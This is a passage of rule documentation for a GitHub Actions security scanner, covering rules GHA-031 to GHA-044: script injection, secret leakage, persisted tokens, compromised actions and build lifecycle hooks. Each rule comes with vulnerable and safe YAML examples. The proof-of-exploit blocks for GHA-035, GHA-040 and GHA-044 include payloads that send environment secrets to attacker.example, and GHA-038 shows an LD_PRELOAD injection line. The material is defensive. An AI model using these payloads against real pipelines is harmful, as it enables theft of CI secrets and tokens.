# runner. The retired commands also stopped being
# supported, so this step silently no-ops at runtime.
jobs:
  extract:
    runs-on: ubuntu-latest
    steps:
      - run: echo "::set-output name=tag::$VERSION"
        id: x

# Safe: use the file-based replacements (``$GITHUB_OUTPUT``
# and ``$GITHUB_STATE``). The new format isn't parsed by
# the runner from stdout, so command-injection through a
# variable value isn't possible.
jobs:
  extract:
    runs-on: ubuntu-latest
    steps:
      - run: echo "tag=$VERSION" >> "$GITHUB_OUTPUT"
        id: x
```

**Source:** [`GHA-031`](../providers/github.md#gha-031) in the [GitHub Actions provider](../providers/github.md).

### `GHA-032`: run: invokes local script on untrusted-trigger workflow <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-032 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** GHA-010 flags ``uses: ./action``, the *action* form of the same threat. This rule extends to direct shell invocation: ``run: ./scripts/setup.sh`` / ``run: bash scripts/setup.sh`` / ``run: python tools/build.py`` resolve against the checked-out workspace, which on ``pull_request_target`` / ``workflow_run`` is PR-controlled. The attacker ships an edited script and gets a default-branch-privileged shell.

**Recommendation.** Either don't run the script under an untrusted trigger, or split the workflow: keep the privileged work on the default branch (``push`` / ``release`` triggers, no PR fork content), and run untrusted-trigger steps in a separate workflow with no secrets and a minimal ``GITHUB_TOKEN`` scope. Pinning the script via ``uses: org/repo@<sha>`` from a separate trusted repo is the canonical fix.

**Known false positives.**

- Workflows that explicitly checkout a *trusted* ref (``ref: ${{ github.event.pull_request.base.sha }}`` or the default branch) before invoking the local script land the trusted bytes on disk, so the script body the PR ships is never executed. The rule has no checkout-graph analysis, it fires on any ``run: ./script`` under an untrusted trigger. Suppress per-workflow via ``--ignore-file`` once you've verified the checkout ref is anchored to a base-branch SHA; the safer pattern is still to split the workflow so secrets aren't in scope during the build half.

**Proof of exploit.**

```
# Vulnerable: an untrusted-trigger workflow
# (``pull_request_target`` / ``workflow_run``) ``run``s
# a local script. The PR head is checked out into the
# workspace; the script the workflow invokes was
# rewritten by the attacker's PR. The privileged trigger
# then executes the PR-controlled script with secrets.
name: comment-lint
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: ./scripts/lint.sh   # attacker rewrote scripts/lint.sh in the PR

# Safe: don't run local scripts under untrusted triggers.
# Move the privileged work to a separate workflow gated
# on ``workflow_dispatch`` (with environment approval) or
# scope ``pull_request_target`` to non-script comment
# operations only.
name: comment-lint
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@<sha>
        with:
          script: |
            // Read-only PR metadata; no checkout of PR head.
            github.rest.issues.createComment({ ... })
```

**Source:** [`GHA-032`](../providers/github.md#gha-032) in the [GitHub Actions provider](../providers/github.md).

### `GHA-033`: Secret value echoed / printed in a run: block <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-033 }

**Evidences:** [`1.5.1`](#ctrl-1-5-1) Ensure scanners are in place to identify and prevent sensitive data in code, [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Three shapes are flagged:

1. **Direct.** A printed argument references a secret context expression, e.g. ``echo "${{ secrets.X }}"`` or ``cat <<<${{ secrets.X }}``.
2. **Indirect env var.** A step ``env:`` block resolves a secret into the env (``X: ${{ secrets.X }}``) and the same step's ``run:`` echoes the env var (``echo "$X"``). Catches the lint-evading form where no ``${{ secrets...}}`` literal appears in the run body.
3. **Shell trace.** The step enables ``set -x`` / ``set -o xtrace`` AND references a secret-bound env var anywhere in the body. Shell trace mode dumps every command with arguments expanded before execution, so a ``curl -H "Bearer $TOKEN"`` line that would normally stay out of the log lands in the log verbatim. The rule fires once per step even though many lines may leak.

Out of scope (deliberate carve-out): inline secret references in a command's *arguments* without shell trace enabled. ``curl --header "Authorization: Bearer ${{ secrets.X }}"`` doesn't echo the header to stdout — the value goes to the network, not the log. That class of leak is covered by GHA-008 (literal credential in YAML) and the network-egress shape of GHA-057, not GHA-033. ``greylag-ci/cicd-goat`` scenario 15 sits squarely in this carve-out: a literal hex token in workflow ``env:`` plus a GET ``curl`` carrying the credential in an ``Authorization:`` header. GHA-008 fires on the literal; GHA-033 deliberately does not.

**Recommendation.** Don't print secret values from a script. GitHub's log redaction is a best-effort string match. It doesn't catch base64 / urlencoded / partial substrings, and any caller that retrieves the raw log via the API gets the unredacted stream. If you need to confirm the secret exists, log a boolean (``[ -n "$X" ] && echo set || echo unset``), never the value itself. Note: a SHA-256 fingerprint or a ``${X:0:N}`` prefix is not a safe substitute either, those shapes still slip past the masker and are flagged by GHA-087 separately.

**Proof of exploit.**

```
# Vulnerable: ``echo $TOKEN`` (or printing a
# ``${{ secrets.X }}`` interpolation) prints the masked
# value to stdout. GitHub masks ``$TOKEN`` with ``***``
# in the log, but ``set -x`` (or any shell-trace mode)
# dumps the literal value because trace output isn't
# subject to the mask. Same applies to ``cat`` / ``tee``
# of any file the secret was written into.
jobs:
  deploy:
    runs-on: ubuntu-latest
    env:
      TOKEN: ${{ secrets.DEPLOY_KEY }}
    steps:
      - run: |
          set -x
          curl -H "Authorization: Bearer $TOKEN" \
            https://api.example.com/deploy

# Safe: don't echo the secret. Drop ``set -x`` (or ensure
# it's set only when no secret env vars are in scope).
# Pass the secret to curl via a stdin / config file so it
# never lands in shell trace output.
jobs:
  deploy:
    runs-on: ubuntu-latest
    env:
      TOKEN: ${{ secrets.DEPLOY_KEY }}
    steps:
      - run: |
          curl --config <(echo "header = \"Authorization: Bearer $TOKEN\"") \
            https://api.example.com/deploy
```

**Source:** [`GHA-033`](../providers/github.md#gha-033) in the [GitHub Actions provider](../providers/github.md).

### `GHA-034`: Reusable workflow called with secrets: inherit <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-034 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Fires on a ``jobs.<id>.uses: ...`` reference whose sibling ``secrets:`` value is the literal string ``inherit``. This is distinct from GHA-025 (which gates on the *pin* of the called workflow): inheritance is a problem even when the call is SHA-pinned, because the surface a compromised callee sees is every caller secret instead of just the named ones. Explicit lists also document the contract, reviewers see exactly which secrets cross the workflow boundary.

**Recommendation.** Replace ``secrets: inherit`` with an explicit list of just the secrets the called workflow actually needs (``secrets: { NPM_TOKEN: ${{ secrets.NPM_TOKEN }} }``). ``inherit`` passes every secret the caller can see, including ones the downstream workflow has no business reading. A compromised or buggy reusable workflow can then exfiltrate credentials the caller never intended to share.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Single-tenant repos that share their entire secrets set with every reusable workflow by policy. Rare in practice, explicit lists make the secret flow visible and don't add much typing. Suppress with ``.pipelinecheckignore`` and a rationale rather than disabling the rule everywhere.

**Source:** [`GHA-034`](../providers/github.md#gha-034) in the [GitHub Actions provider](../providers/github.md).

### `GHA-035`: github-script step interpolates untrusted context <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-035 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** GHA-003 covers ``run:`` blocks where shell expansion is the injection surface. ``actions/github-script@<ref>`` runs the ``script:`` input as Node.js inside an authenticated Octokit context, same threat model, different language. The rule fires when ``script:`` (or the legacy ``previews:`` companion for inline JS) contains a ``${{ github.event.* }}``, ``${{ inputs.* }}``, ``${{ github.head_ref }}``, ``${{ github.ref_name }}``, or any other untrusted context expression, exactly the same catalog GHA-003 uses.

**Recommendation.** Pass attacker-controllable values through ``env:`` and read them inside the script via ``process.env.X`` instead of interpolating ``${{ ... }}`` directly into the script body. GitHub expands the expression *before* the JavaScript engine parses the source, so backticks, quotes, and ``${...}`` characters in the source field break out of the surrounding string and execute as JavaScript with the workflow's GITHUB_TOKEN in scope.

**Known false positives.**

- Scripts that interpolate ``${{ steps.*.outputs.* }}`` from a trusted upstream step are out of scope (the rule only matches the curated untrusted-context regex). If you intentionally rely on a non-curated context, suppress with a brief ``.pipelinecheckignore`` rationale.

**Proof of exploit.**

```
# Vulnerable: a PR title containing
#   `;require('child_process').execSync('curl https://attacker.example/-d "$(env)"');//
# closes the surrounding string, runs Node code against the
# workflow's GITHUB_TOKEN, and exfiltrates every env var.
jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@<sha>
        with:
          script: |
            const title = `${{ github.event.pull_request.title }}`;
            await github.rest.issues.createComment({ body: title });

# Safe: route the value through env so Node sees it as a
# string, never as JavaScript source.
jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@<sha>
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        with:
          script: |
            await github.rest.issues.createComment({
              body: process.env.PR_TITLE,
            });
```

**Source:** [`GHA-035`](../providers/github.md#gha-035) in the [GitHub Actions provider](../providers/github.md).

### `GHA-036`: runs-on interpolates untrusted context <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-036 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** GHA-012 catches self-hosted runners that aren't ephemeral; this rule catches the upstream targeting choice. When ``runs-on`` is computed from an untrusted expression, the caller picks where the workflow runs, including any self-hosted label the org owns. A reusable workflow that declares ``runs-on: ${{ inputs.runner }}`` lets a downstream caller route the job onto the production-deploy fleet (or any other privileged label) and execute arbitrary code with the privileges that fleet inherits. The same surface exists via ``workflow_dispatch`` inputs and any ``${{ github.event.* }}`` field that an attacker can populate. The rule walks all three ``runs-on`` shapes, string scalar, list of labels, and the long-form ``{ group, labels }`` dict, and matches the same untrusted-context regex GHA-003 / GHA-035 use.

**Recommendation.** Hard-code ``runs-on:`` to a specific runner label or list of labels. If the choice has to be parameterised across callers, validate the input against an allowlist of known-good labels before the job runs (a small ``if:`` guard at job level), and never accept ``${{ inputs.* }}`` or any ``${{ github.event.* }}`` field as the ``runs-on`` value directly.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Workflows that intentionally select runners by environment via a vetted matrix (``runs-on: ${{ matrix.os }}`` where ``matrix.os`` is a hard-coded list inside the workflow) are out of scope, the matrix values are author-controlled, not caller-controlled. The rule only matches the catalog of untrusted contexts (``inputs.*``, ``github.event.*``, ``github.head_ref``, …); ``matrix.*`` and ``env.*`` references are intentionally not flagged.

**Proof of exploit.**

```
# Vulnerable: workflow_dispatch input picks the runner. A
# caller who can dispatch the workflow picks ``prod-deploy``
# (or any other privileged self-hosted label the org owns)
# and the job runs with that fleet's inherited identity.
on:
  workflow_dispatch:
    inputs:
      runner:
        type: string
        required: true
jobs:
  run:
    runs-on: ${{ inputs.runner }}
    steps:
      - run: ./scripts/build

# Safe: pin to a hard-coded label. If the choice really has
# to be parameterised, validate the input against an
# allowlist at job-level via a small if: guard before any
# step runs.
on: { workflow_dispatch: {} }
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - run: ./scripts/build
```

**Source:** [`GHA-036`](../providers/github.md#gha-036) in the [GitHub Actions provider](../providers/github.md).

### `GHA-037`: actions/checkout persists GITHUB_TOKEN into .git/config <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-037 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Detection fires on any step whose ``uses:`` starts with ``actions/checkout@`` and whose ``with:`` block either omits ``persist-credentials`` (the unsafe default) or sets it to ``true`` explicitly.

This is the failure pattern Zizmor calls *Artipacked* and the StepSecurity / harden-runner audit set tracks as ``persist-credentials``-default. Real-world exploit chains (the ``ultralytics`` 2024 RCE, multiple Mend / Snyk advisories) exploit exactly this primitive: a first checkout step persists the token, a later ``run:`` step (often a build script the attacker can influence via PR contents) reads ``.git/config`` and ships the token out.

Sister rule: GHA-019 catches the explicit ``echo $GITHUB_TOKEN > file`` shape; GHA-037 catches the implicit checkout-default that doesn't go through a ``run:`` line at all.

**Recommendation.** Set ``persist-credentials: false`` on every ``actions/checkout`` step that doesn't need to push back to the repo. The default in v3 / v4 is ``true``, which writes the GITHUB_TOKEN into ``.git/config`` as an ``http.https://github.com/.extraheader`` line. Any subsequent ``run:`` step in the same job can read it with ``git config --get http.https://github.com/.extraheader`` and exfiltrate the token to a remote endpoint, even if that step's own scope is read-only. If the workflow genuinely needs to push (release publishing, doc-site deploys), do the push as the very next step and immediately follow with a checkout that sets ``persist-credentials: false`` so the token doesn't leak into later, less-trusted steps.

**Known false positives.**

- Workflows that genuinely need ``persist-credentials: true`` to push back to the repo (a release-tag bot, a docs-deploy job, ``stefanzweifel/git-auto-commit-action``) shouldn't suppress this rule globally; instead, scope ``persist-credentials: true`` to a named step, then run the push immediately, then use a fresh ``actions/checkout`` with ``persist-credentials: false`` so the token doesn't leak into later steps. Suppress on the specific step name only when the scoped pattern is in place.

**Proof of exploit.**

```
# Vulnerable: ``actions/checkout`` with
# ``persist-credentials: true`` (the default) writes the
# runtime ``GITHUB_TOKEN`` into ``.git/config`` as an
# ``http.<host>/.extraheader``. Any subsequent step that
# reads ``.git/config`` (an artifact upload of the repo
# root, a ``cat .git/config`` for debugging) exposes the
# token. The ArtiPACKED attack chain rides exactly this.
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        # default persist-credentials: true
      - run: ./build.sh
      - uses: actions/upload-artifact@<sha>
        with:
          name: build
          path: .   # uploads .git/config with token

# Safe: set ``persist-credentials: false`` so the token
# only lives in the checkout's request, not in the
# on-disk config. Subsequent steps that need to push use
# an explicit credential (and only on the step that needs
# it).
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          persist-credentials: false
      - run: ./build.sh
      - uses: actions/upload-artifact@<sha>
        with:
          name: build
          path: dist/   # not the repo root
```

**Source:** [`GHA-037`](../providers/github.md#gha-037) in the [GitHub Actions provider](../providers/github.md).

### `GHA-038`: Workflow re-enables retired ::set-env / ::add-path commands <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-038 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Detection fires when ``ACTIONS_ALLOW_UNSECURE_COMMANDS`` is set to any truthy value at the workflow ``env:`` level, the job ``env:`` level, or any step's ``env:`` block. Accepted truthy spellings: ``true`` / ``1`` / ``yes`` / ``on`` (including quoted forms like ``"true"`` and case-insensitive variants like ``YES`` / ``On``).

Sister rule GHA-031 catches direct uses of ``::set-output::`` / ``::save-state::`` in step scripts. GHA-038 catches the explicit re-enable flag, which is the strictly worse case: it implicitly accepts every ``::set-env::`` / ``::add-path::`` line that lands on the runner's stdout from any tool the step invokes, not just the workflow author's own ``echo`` commands. A downloaded build log, a container's startup banner, an upstream test runner's output, all become injection vectors.

**Recommendation.** Drop the ``ACTIONS_ALLOW_UNSECURE_COMMANDS`` env definition entirely, then migrate any leftover ``::set-env::`` / ``::add-path::`` workflow commands to the file-redirect form (``echo "X=$VAL" >> "$GITHUB_ENV"`` and ``echo "$DIR" >> "$GITHUB_PATH"``). GitHub disabled the legacy commands in 2020 specifically because they share the runner's stdout as a control channel: any log line starting with ``::`` could inject environment variables, prepend to PATH, or set step outputs. Setting the override flag back to ``true`` re-opens that injection channel for the entire workflow scope.

**Known false positives.**

- Some legacy actions (last-updated pre-2020) still emit ``::set-env::`` lines and rely on the override to be set. Replace the action rather than suppressing this rule, the security exposure outweighs the cost of an alternative action.

**Proof of exploit.**

```
# Vulnerable: the workflow re-enables the retired command
# channel. Any tool output containing ``::set-env::`` (a
# build log, a downloaded artifact, an upstream test runner)
# now injects environment variables into subsequent steps.
# A printed line
#   ::set-env name=LD_PRELOAD::/tmp/x.so
# from a compromised transitive dep silently rewires the
# linker on the next ``run:`` step.
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      ACTIONS_ALLOW_UNSECURE_COMMANDS: "true"
    steps:
      - uses: actions/checkout@<sha>
      - run: ./scripts/build

# Safe: don't set the override; use the file-redirect form
# for any env / PATH mutation the workflow legitimately needs.
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: |
          echo "BUILD_TAG=$(git rev-parse --short HEAD)" >> "$GITHUB_ENV"
      - run: ./scripts/build
```

**Source:** [`GHA-038`](../providers/github.md#gha-038) in the [GitHub Actions provider](../providers/github.md).

### `GHA-039`: services / container credentials embedded as literal in workflow <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-039 }

**Evidences:** [`1.5.1`](#ctrl-1-5-1) Ensure scanners are in place to identify and prevent sensitive data in code, [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** GitHub Actions accepts a ``credentials:`` map on both the job-level ``container:`` block (the runner image) and on each ``services.<name>:`` entry (sidecar containers). The map is the documented way to pull a private image from a registry that requires auth, and it expects ``${{ secrets.* }}`` references for both fields.

GHA-008 scans the workflow for credential **patterns** (AWS access keys, JWTs, Slack tokens, etc.) but doesn't trip on a plain password like ``hunter2`` or a registry username like ``ci-deploy-bot``. GHA-039 catches them by **position**: any literal value in a ``credentials.username`` / ``credentials.password`` field is by definition a leaked credential, regardless of its shape. Closes parity with Zizmor's ``hardcoded-container-credentials`` rule.

**Recommendation.** Move every ``services.<name>.credentials.username`` / ``credentials.password`` value (and the same field on a job-level ``container:`` block) out of the workflow YAML and into a repository or environment secret. Reference the secret via ``${{ secrets.NAME }}`` from the same credentials block. Anything written as a literal is permanently visible in every fork of the repo, every build log that prints the runner's start banner, and every cached job summary, so the credential must be treated as compromised on the spot. The fix is the rotation, plus the secret reference, plus a check that no other workflow keeps the literal pattern.

**Known false positives.**

- Workflows that legitimately use a public anonymous registry mirror occasionally hardcode ``username: anonymous`` / ``password: ""`` for clarity. Both shapes are filtered out automatically (empty / whitespace-only values, plus the literal ``anonymous`` username), but if your fixture uses another sentinel for anonymous access, suppress the specific job/service in the ignore-file rather than the rule globally.

**Proof of exploit.**

```
# Vulnerable: literal username/password embedded in a
# ``container.credentials`` block (or in a service's
# credentials). The workflow file is committed to git
# and visible to every repo reader; the build log also
# carries the literal once the runner pulls the image.
jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: registry.example.com/myorg/build@sha256:abc123...
      credentials:
        username: build-bot
        password: hunter2-prod-registry-token
    steps:
      - run: make build

# Safe: reference a repo / org secret. The actual value
# resolves at runtime, is masked in logs, and rotates in
# the secrets store without a workflow change.
jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: registry.example.com/myorg/build@sha256:abc123...
      credentials:
        username: ${{ secrets.REGISTRY_USERNAME }}
        password: ${{ secrets.REGISTRY_PASSWORD }}
    steps:
      - run: make build
```

**Source:** [`GHA-039`](../providers/github.md#gha-039) in the [GitHub Actions provider](../providers/github.md).

### `GHA-040`: Action reference matches a known-compromised SHA or tag <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-040 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Walks every workflow's ``steps[].uses:`` and ``jobs.<id>.uses:`` references against the curated compromised-action registry in ``pipeline_check.core.checks.github._compromised_actions``. Match is case-insensitive on owner / repo and exact on the ``ref`` value (commit SHA or tag name). Registry is deliberately small and append-only — refresh by PR with the citing advisory in the commit message; no fetch-from-network registry to avoid taking on a telemetry surface.

**Recommendation.** Rotate every secret that may have been reachable to a workflow run that hit the compromised reference, then update the ``uses:`` reference to a known-clean SHA published by the upstream maintainer post-incident (usually announced in the advisory body). Audit CI logs for the affected window for any sign that the malicious payload ran against this repo.

**Known false positives.**

- The registry covers only public, advisory-confirmed compromises. Pre-disclosure compromises and yet-unpublished maintainer-account takeovers do not land until the citing CVE / GHSA exists. Pair with GHA-001 (SHA pinning) and GHA-025 (tag-rewrite detection) for the prevention angle.

**Seen in the wild.**

- tj-actions/changed-files compromise ([CVE-2025-30066](https://www.cve.org/CVERecord?id=CVE-2025-30066), March 2025): the canonical case the registry was built for. Roughly 23,000 tag-pinned repos shipped CI secrets to an exfiltration endpoint over a ~24-hour window before GitHub blocked the malicious commits.
- reviewdog/action-setup compromise ([CVE-2025-30154](https://www.cve.org/CVERecord?id=CVE-2025-30154), March 2025): same week as tj-actions; smaller blast radius but identical mechanism. Tag-pinned consumers were affected; SHA-pinned consumers who happened to match the malicious commit were also affected.

**Proof of exploit.**

```
# Vulnerable: pinned to a SHA the attacker landed under @v45.
# (Substitute the actual malicious-commit SHA from the CVE-2025-30066
# advisory; the registry in _compromised_actions.py carries it.)
- uses: tj-actions/changed-files@<advisory-malicious-sha>

# Same applies to tag pins that resolved to the malicious
# commit during the compromise window:
- uses: tj-actions/changed-files@v45     # WAS pointing at the bad commit

# Attack: the injected action body exfiltrated CI secrets by
# dumping the runner process environment to a controlled host:
#   curl -X POST https://attacker.example/exfil \
#     -d "$(cat /proc/self/environ)"
#
# Every workflow run that hit one of those refs over the
# compromise window leaked the entire env block, including
# ${{ secrets.* }} and GITHUB_TOKEN.

# Safe: pin to the post-incident clean SHA the maintainer
# republished in the advisory (consult the GHSA the registry
# cites for the exact value):
- uses: tj-actions/changed-files@<advisory-clean-sha>
```

**Source:** [`GHA-040`](../providers/github.md#gha-040) in the [GitHub Actions provider](../providers/github.md).

### `GHA-041`: Action upstream repo has a single contributor <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-041 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Reads the contributor count from ``ctx.action_metadata[owner/repo].contributor_count`` (populated by the ``--resolve-remote`` path; the GitHub REST ``/contributors`` endpoint, capped at two entries — the rule only cares about == 1). When the fetch failed or the flag is off, the rule passes silently. Forks and archived repos that ALSO have a single contributor fire the rule; the fork / archived state is part of the same supply-chain risk story.

**Recommendation.** Audit the action repo's contributor list. If the repo genuinely has one maintainer, pin to a vendored fork under your org's control (so a future compromise on the upstream doesn't reach your build runtime) or move to a first-party action covering the same surface. The single-maintainer pattern is what made tj-actions / reviewdog one-day compromises so widely-blast.

**Known false positives.**

- Some well-maintained single-author actions (high-quality personal-account repos that the maintainer simply hasn't open-sourced governance for) are not actually compromised. Suppress via ignore-file when a security review has confirmed the maintainer's identity and 2FA posture.

**Seen in the wild.**

- tj-actions / reviewdog March 2025 compromises (CVE-2025-30066 / CVE-2025-30154): both upstream repos had a single primary contributor at the time of compromise. The single-maintainer pattern was central to the blast radius (no second pair of eyes on the malicious commit, no auto-rollback when the tag move landed).

**Source:** [`GHA-041`](../providers/github.md#gha-041) in the [GitHub Actions provider](../providers/github.md).

### `GHA-042`: Action upstream repo is newly created <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-042 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Reads ``created_at`` from ``ctx.action_metadata[owner/repo]`` (populated by the ``--resolve-remote`` path). Fires when the repo's age in days is below ``MIN_AGE_DAYS`` (90). Without the opt-in flag the rule passes silently with a nudge.

**Recommendation.** Verify the action repo is the real upstream and not a typosquat. Compare the spelling and owner against the intended action (``actions/checkout`` vs ``actoins/checkout``); check the repo description, stars, and prior releases. If the action is genuinely new but trusted, suppress via ignore-file with a dated note; the suppression decays naturally as the repo ages past the 90-day threshold.

**Known false positives.**

- Newly-released first-party actions from a trusted org (say, a freshly-launched ``actions/foo`` rolled out by GitHub itself) fire while they're still young. Suppress via ignore-file with a dated note; the entry expires naturally once the repo crosses the age threshold.

**Seen in the wild.**

- GitGuardian / StepSecurity typosquat reports (2023-2024) document several action-naming impersonations that appeared as newly-registered repos and reached production CI before the legitimate owner was notified.

**Source:** [`GHA-042`](../providers/github.md#gha-042) in the [GitHub Actions provider](../providers/github.md).

### `GHA-043`: Low-star action runs with sensitive permissions <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-043 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Reads ``stargazers_count`` from ``ctx.action_metadata[owner/repo]`` and the effective ``permissions:`` block (job-level wins; falls back to workflow-top-level; falls back to the caller's inherited block for resolved reusable workflows). Fires when stars < ``MAX_STARS`` (25) AND any of 'contents', 'packages', 'id-token', 'actions', 'deployments' is set to ``write`` on the calling job. ``permissions: write-all`` is treated as all scopes set to write.

**Recommendation.** Either narrow the calling job's ``permissions:`` to the minimum the action actually needs (drop ``contents: write`` / ``id-token: write`` / ``packages: write`` / ``actions: write`` / ``deployments: write`` unless the action's documented surface requires them), or replace the action with a community-reviewed alternative. The rule fires the COMBINATION of low community review and elevated permissions; either side alone is fine.

**Known false positives.**

- Internal first-party actions hosted in a private org repo legitimately have low public star counts; their threat model is different and the rule does not distinguish internal from third-party. Suppress via ignore-file when the action is in-org and trusted.

**Seen in the wild.**

- GitGuardian 2023 supply-chain audit: a handful of low-popularity actions with ``contents: write`` were weaponized via single-PR maintainer-impersonation compromises; the elevated permission was the privilege amplifier that let the attacker push code back to the victim's default branch on the same workflow run.

**Proof of exploit.**

```
# Vulnerable: ``uses: rando-user/single-maintainer-action``
# is a low-star action from a single-maintainer repo,
# AND the calling job grants ``contents: write`` /
# ``id-token: write`` / similar. A compromised maintainer
# (or a typosquat / namespace takeover) ships code into
# the runner with write access to the repo.
jobs:
  release:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      id-token: write
    steps:
      - uses: rando-user/auto-release@<sha>   # 4 stars, 1 maintainer

# Safe: vet the action's reputation before granting
# sensitive permissions. Prefer first-party / verified-
# creator actions for privileged jobs. If a niche action
# is truly required, fork it into your own org, vendor
# the maintained version, and pin to your fork's SHA.
jobs:
  release:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      id-token: write
    steps:
      - uses: softprops/action-gh-release@<sha>   # verified-creator equivalent
```

**Source:** [`GHA-043`](../providers/github.md#gha-043) in the [GitHub Actions provider](../providers/github.md).

### `GHA-044`: Build tool runs lifecycle scripts on untrusted-trigger workflow <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-044 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Package managers and build tools execute code by design. ``npm install`` / ``pnpm install`` / ``yarn`` / ``bun install`` run ``preinstall`` / ``install`` / ``postinstall`` / ``prepare`` from the PR's ``package.json``; ``deno install`` resolves the PR's ``deno.json`` / ``package.json`` and (when ``--allow-scripts`` opts in) runs the same npm lifecycle hooks; ``pip install .`` runs the PR's ``setup.py``; ``make`` runs the PR's ``Makefile``; ``mvn`` / ``gradle`` load plugins declared in the PR's ``pom.xml`` / ``build.gradle``; ``cargo build`` runs ``build.rs``. Under ``pull_request_target`` / ``workflow_run``, the surrounding context already has secrets and a write-scope token, so the lifecycle hook is the entire attack.

**Recommendation.** Don't run install / build commands under ``pull_request_target`` or ``workflow_run`` against a tree that may be PR-controlled. Split the workflow: keep the privileged work on ``push`` / ``release`` (no fork content), and run untrusted builds in a separate ``pull_request`` workflow with no secrets and a read-only ``GITHUB_TOKEN``. If you must build PR code with secrets, do it inside a container with no network egress and a minimal filesystem, never directly on the runner.

**Known false positives.**

- Workflows that pin the workspace to a trusted ref before invoking the build tool (``actions/checkout`` with no ``ref:`` override on ``pull_request_target``, or a fresh checkout of a default-branch SHA) aren't actually exposed. The rule fires on the build-tool invocation alone; suppress with a ``.pipelinecheckignore`` rationale when the workspace is provably clean.

**Seen in the wild.**

- Trail of Bits ``Public PPE`` write-up (2022): demonstrated the primitive against ``pull_request_target`` workflows that ran ``npm install`` after checking out PR content. The PR-supplied ``preinstall`` script ran with the base repo's secrets in scope. Same shape with ``pip install -e .`` (setup.py) and ``make`` (Makefile).
- Cycode / Legit Security ``Poisoned Pipeline Execution`` research (2022-2023) catalogued dozens of OSS repos where a privileged-trigger workflow's build step executed PR-controlled config: ``setup.py``'s ``cmdclass``, ``build.gradle``'s ``init.gradle``, ``pom.xml``'s ``<build><plugins>``. The fix pattern is always: don't build untrusted code with secrets in scope.

**Proof of exploit.**

```
# Vulnerable: pull_request_target + npm install.
name: pr-build
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install         # executes package.json scripts

# Attack: PR ships a tampered package.json with:
#
#   "scripts": {
#     "preinstall": "curl -X POST https://attacker.example/x \
#       -d \"$(env | base64 -w0)\""
#   }
#
# ``npm install`` runs ``preinstall`` before resolving any
# dependency, so the exfil fires the moment the workflow
# starts. Same shape with pip install -e . (runs setup.py),
# make (runs Makefile), mvn (runs pom.xml plugins), gradle
# (runs init scripts), cargo build (runs build.rs).

# Safe: split the workflow. Privileged labeler runs on
# pull_request_target with secrets but never installs the
# PR. The build runs on pull_request with no secrets:
name: build
on: { pull_request: {} }
jobs:
  build:
    runs-on: ubuntu-latest
